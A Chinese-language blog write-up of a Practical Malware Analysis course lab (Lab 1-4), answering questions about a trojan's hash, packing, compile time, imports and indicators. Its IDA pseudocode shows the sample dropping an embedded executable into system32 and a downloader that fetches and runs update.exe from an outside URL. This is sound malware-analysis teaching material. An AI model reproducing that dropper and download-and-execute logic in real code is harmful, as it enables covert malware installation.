<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>- shesl's blog</title><meta name=Description content="佘崧林同学的碎碎念博客"><meta property="og:title" content><meta property="og:description" content="lab 1-4 QUESTION 1 Upload the Lab01-04.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions? 文件的 sha256 哈希值： 1 2 $ sha256sum Lab01-04.exe 0fa1498340fca6c562cfa389ad3e93395f44c72fd128d7ba08579a69aaf3b126 Lab01-04.exe 因此上传的 url 为：https://www.virustotal.com/#/f"><meta property="og:type" content="article"><meta property="og:url" content="http://shesl-meow.github.io/book/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-4/"><meta property="og:image" content="http://shesl-meow.github.io/avatar.png"><meta property="article:section" content="book"><meta property="og:site_name" content="shesl's blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://shesl-meow.github.io/avatar.png"><meta name=twitter:title content><meta name=twitter:description content="lab 1-4 QUESTION 1 Upload the Lab01-04.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions? 文件的 sha256 哈希值： 1 2 $ sha256sum Lab01-04.exe 0fa1498340fca6c562cfa389ad3e93395f44c72fd128d7ba08579a69aaf3b126 Lab01-04.exe 因此上传的 url 为：https://www.virustotal.com/#/f"><meta name=application-name content="shesl's blog"><meta name=apple-mobile-web-app-title content="shesl's blog"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=http://shesl-meow.github.io/book/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-4/><link rel=next href=http://shesl-meow.github.io/book/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-3/><link rel=stylesheet href=/css/style.min.fa85115dce490a9d0bf009e2892b6d42439bdea75160d08cddcb0b97c8def676.css integrity="sha256-+oURXc5JCp0L8AniiSttQkOb3qdRYNCM3csLl8je9nY="><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/shesl-meow.github.io\/book\/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B\/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90\/01\/lab1-4\/"},"genre":"book","wordcount":1197,"url":"http:\/\/shesl-meow.github.io\/book\/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B\/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90\/01\/lab1-4\/","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"佘崧林"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="shesl's blog">shesl-meow</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>博客 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="shesl's blog">shesl-meow</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>博客</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster"></h1><div class=content id=content><h1 id=lab-1-4>lab 1-4</h1><h2 id=question-1>QUESTION 1</h2><blockquote><p>Upload the Lab01-04.exe file to <a href=http://www.VirusTotal.com/ target=_blank rel="noopener noreffer">http://www.VirusTotal.com/</a>. Does it match any existing antivirus definitions?</p></blockquote><p>文件的 sha256 哈希值：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sha256sum Lab01-04.exe
</span></span><span class=line><span class=cl>0fa1498340fca6c562cfa389ad3e93395f44c72fd128d7ba08579a69aaf3b126  Lab01-04.exe
</span></span></code></pre></td></tr></table></div></div><p>因此上传的 <code>url</code> 为：https://www.virustotal.com/#/file/0fa1498340fca6c562cfa389ad3e93395f44c72fd128d7ba08579a69aaf3b126/detection</p><p>可以看到这同样是一个被 53 个引擎检测出来的木马。</p><h2 id=question-2>QUESTION 2</h2><blockquote><p>Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.</p></blockquote><p>使用 <code>blackarch</code> 的工具 <code>packerid</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ packerid Lab01-04.exe 
</span></span><span class=line><span class=cl><span class=o>[</span><span class=s1>&#39;Microsoft Visual C++ v5.0/v6.0 (MFC)&#39;</span><span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>可见这个文件并没有加壳。</p><h2 id=question-3>QUESTION 3</h2><blockquote><p>When was this program compiled?</p></blockquote><p>PE 文件的文件结构可以参考<a href=https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format target=_blank rel="noopener noreffer">微软的官方文档</a>。</p><p>可以找到在对象文件的的最开始，存在一个标准文件头，其中有一个 <code>TimeDateStamp</code> 域，指示了文件创建时的时间戳，可以使用以下的 python 脚本读取它：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#！/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>datetime</span> <span class=kn>import</span> <span class=n>datetime</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pefile</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pe</span> <span class=o>=</span> <span class=n>pefile</span><span class=o>.</span><span class=n>PE</span><span class=p>(</span><span class=s2>&#34;/tmp/BinaryCollection/Chapter_1L/Lab01-04.exe&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>datetime</span><span class=o>.</span><span class=n>fromtimestamp</span><span class=p>(</span><span class=n>pe</span><span class=o>.</span><span class=n>FILE_HEADER</span><span class=o>.</span><span class=n>TimeDateStamp</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python labb01-04.exe
</span></span><span class=line><span class=cl>2019-08-31 06:26:59
</span></span></code></pre></td></tr></table></div></div><h2 id=question-4>QUESTION 4</h2><blockquote><p>Do any imports hint at this program’s functionality? If so, which imports are they and what do they tell you?</p></blockquote><p>使用 <code>blackarch</code> 的工具 <code>malscan</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ malscan Lab01-04.exe
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=o>[</span>Imports Overview<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>KERNEL32.dll
</span></span><span class=line><span class=cl>        0x402010 GetProcAddress
</span></span><span class=line><span class=cl>        0x402014 LoadLibraryA
</span></span><span class=line><span class=cl>        0x402018 WinExec
</span></span><span class=line><span class=cl>        0x40201c WriteFile
</span></span><span class=line><span class=cl>        0x402020 CreateFileA
</span></span><span class=line><span class=cl>        0x402024 SizeofResource
</span></span><span class=line><span class=cl>        0x402028 CreateRemoteThread
</span></span><span class=line><span class=cl>        0x40202c FindResourceA
</span></span><span class=line><span class=cl>        0x402030 GetModuleHandleA
</span></span><span class=line><span class=cl>        0x402034 GetWindowsDirectoryA
</span></span><span class=line><span class=cl>        0x402038 MoveFileA
</span></span><span class=line><span class=cl>        0x40203c GetTempPathA
</span></span><span class=line><span class=cl>        0x402040 GetCurrentProcess
</span></span><span class=line><span class=cl>        0x402044 OpenProcess
</span></span><span class=line><span class=cl>        0x402048 CloseHandle
</span></span><span class=line><span class=cl>        0x40204c LoadResource
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ADVAPI32.dll
</span></span><span class=line><span class=cl>        0x402000 OpenProcessToken
</span></span><span class=line><span class=cl>        0x402004 LookupPrivilegeValueA
</span></span><span class=line><span class=cl>        0x402008 AdjustTokenPrivileges
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>MSVCRT.dll
</span></span><span class=line><span class=cl>        0x402054 _snprintf
</span></span><span class=line><span class=cl>        0x402058 _exit
</span></span><span class=line><span class=cl>        0x40205c _XcptFilter
</span></span><span class=line><span class=cl>        0x402060 <span class=nb>exit</span>
</span></span><span class=line><span class=cl>        0x402064 __p___initenv
</span></span><span class=line><span class=cl>        0x402068 __getmainargs
</span></span><span class=line><span class=cl>        0x40206c _initterm
</span></span><span class=line><span class=cl>        0x402070 __setusermatherr
</span></span><span class=line><span class=cl>        0x402074 _adjust_fdiv
</span></span><span class=line><span class=cl>        0x402078 __p__commode
</span></span><span class=line><span class=cl>        0x40207c __p__fmode
</span></span><span class=line><span class=cl>        0x402080 __set_app_type
</span></span><span class=line><span class=cl>        0x402084 _except_handler3
</span></span><span class=line><span class=cl>        0x402088 _controlfp
</span></span><span class=line><span class=cl>        0x40208c _stricmp
</span></span><span class=line><span class=cl>...
</span></span></code></pre></td></tr></table></div></div><p>可见这个可执行文件导入了，执行命令、复制移动写文件、读取文件资源大小、读取文件树、打开关闭进程等危险函数，猜测这是实现了一个了文件查看器的恶意病毒。</p><h2 id=question-5>QUESTION 5</h2><blockquote><p>What host- or network-based indicators could be used to identify this malware on infected machines?</p></blockquote><p>我们用 <code>ida pro</code> 打开这个可执行文件，先查看它里面的字符串：</p><p><img class=lazyload src=/svg/loading.min.svg data-src=../04.exe.ida.strings.png data-srcset="../04.exe.ida.strings.png, ../04.exe.ida.strings.png 1.5x, ../04.exe.ida.strings.png 2x" data-sizes=auto alt=../04.exe.ida.strings.png title=04.exe.ida.strings></p><p>我们发现 <code>\\system32\\wupdmgr.exe</code> 这样一个字符串，我们查找调用的位置，并查看调用位置的伪代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>GetWindowsDirectoryA</span><span class=p>(</span><span class=o>&amp;</span><span class=n>Buffer</span><span class=p>,</span> <span class=mh>0x10Eu</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>snprintf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>Dest</span><span class=p>,</span> <span class=mh>0x10Eu</span><span class=p>,</span> <span class=n>Format</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>Buffer</span><span class=p>,</span> <span class=n>aSystem32Wupdmg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>hModule</span> <span class=o>=</span> <span class=n>GetModuleHandleA</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>hResInfo</span> <span class=o>=</span> <span class=n>FindResourceA</span><span class=p>(</span><span class=n>hModule</span><span class=p>,</span> <span class=n>Name</span><span class=p>,</span> <span class=n>Type</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>lpBuffer</span> <span class=o>=</span> <span class=n>LoadResource</span><span class=p>(</span><span class=n>hModule</span><span class=p>,</span> <span class=n>hResInfo</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>nNumberOfBytesToWrite</span> <span class=o>=</span> <span class=n>SizeofResource</span><span class=p>(</span><span class=n>hModule</span><span class=p>,</span> <span class=n>hResInfo</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>hFile</span> <span class=o>=</span> <span class=n>CreateFileA</span><span class=p>(</span><span class=o>&amp;</span><span class=n>Dest</span><span class=p>,</span> <span class=mh>0x40000000u</span><span class=p>,</span> <span class=mi>1u</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2u</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>WriteFile</span><span class=p>(</span><span class=n>hFile</span><span class=p>,</span> <span class=n>lpBuffer</span><span class=p>,</span> <span class=n>nNumberOfBytesToWrite</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>NumberOfBytesWritten</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>CloseHandle</span><span class=p>(</span><span class=n>hFile</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>WinExec</span><span class=p>(</span><span class=o>&amp;</span><span class=n>Dest</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这段代码的大致用处应该是加载一个可执行文件的资源，然后把这个可执行文件资源复制到一个给定的位置（即 <code>\\system32\\wupdmgr.exe</code>），然后执行它。这并没有网络相关请求。</p><p>于是我们通过 <code>binwalk</code> 命令提取出其中的资源：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ binwalk --dd<span class=o>=</span><span class=s2>&#34;.*&#34;</span> Lab01-04.exe
</span></span><span class=line><span class=cl>DECIMAL       HEXADECIMAL     DESCRIPTION
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------
</span></span><span class=line><span class=cl><span class=m>0</span>             0x0             Microsoft executable, portable <span class=o>(</span>PE<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=m>16480</span>         0x4060          Microsoft executable, portable <span class=o>(</span>PE<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>这条命令将给定文件 <code>Lab01-04.exe</code> 中的资源提取到了文件夹 <code>_Lab01-04.exe.extracted</code> 中。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>cd</span> _Lab01-04.exe.etracted/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ ls
</span></span><span class=line><span class=cl><span class=m>0</span>  <span class=m>4060</span>
</span></span></code></pre></td></tr></table></div></div><p>我们发现提取出了 <code>0</code> 和 <code>4060</code> 这两个资源，很显然 <code>0</code> 即为之前分析的可执行文件，我们再用 <code>ida pro</code> 分析其中的资源文件 <code>4060</code>：</p><p><img class=lazyload src=/svg/loading.min.svg data-src=../04.resources.ida.string.png data-srcset="../04.resources.ida.string.png, ../04.resources.ida.string.png 1.5x, ../04.resources.ida.string.png 2x" data-sizes=auto alt=../04.resources.ida.string.png title=04.resources.ida.string></p><p>我们发现了一个 <code>URL</code> 地址，并且我们还在导入表中发现了 <code>URLDownloadToFileA</code> 这个导入函数，我们再分析调用这个字符串位置的伪代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>GetTempPathA</span><span class=p>(</span><span class=mh>0x10Eu</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>Buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>snprintf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>Dest</span><span class=p>,</span> <span class=mh>0x10Eu</span><span class=p>,</span> <span class=n>Format</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>Buffer</span><span class=p>,</span> <span class=n>aWinupExe</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>WinExec</span><span class=p>(</span><span class=o>&amp;</span><span class=n>Dest</span><span class=p>,</span> <span class=mi>5u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>GetWindowsDirectoryA</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v7</span><span class=p>,</span> <span class=mh>0x10Eu</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>snprintf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>CmdLine</span><span class=p>,</span> <span class=mh>0x10Eu</span><span class=p>,</span> <span class=n>aSS_0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v7</span><span class=p>,</span> <span class=n>aSystem32Wupdmg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>URLDownloadToFileA</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>aHttpWwwPractic</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>CmdLine</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>WinExec</span><span class=p>(</span><span class=o>&amp;</span><span class=n>CmdLine</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这个段伪代码，向 <code>http://www.practicalmalwareanalysis.com/update.exe</code>，下载病毒资源文件并且保存到 <code>\\system32\\wupdmgrd.exe</code> 这个文件中。</p><p>所以需要监测网络中是否与 <code>http://www.practicalmalwareanalysis.com/update.exe</code> 建立了连接。</p><h2 id=question-6>QUESTION 6</h2><blockquote><p>This file has one resource in the resource section. Use Resource Hacker to examine that resource, and then use it to extract the resource. What can you learn from the resource?</p></blockquote><p>在第五问中已经使用 <code>binwalk</code> 提取出来了。</p></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://shesl-meow.github.io target=_blank>佘崧林</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/copy-tex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/algoliasearch@4.13.0/dist/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:50},comment:{valine:{appId:"zDVJohJIQbD6f3W267xtaYRC-gzGzoHsz",appKey:"ewsfU9ocNOeuvt0MzONe6yKx",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png"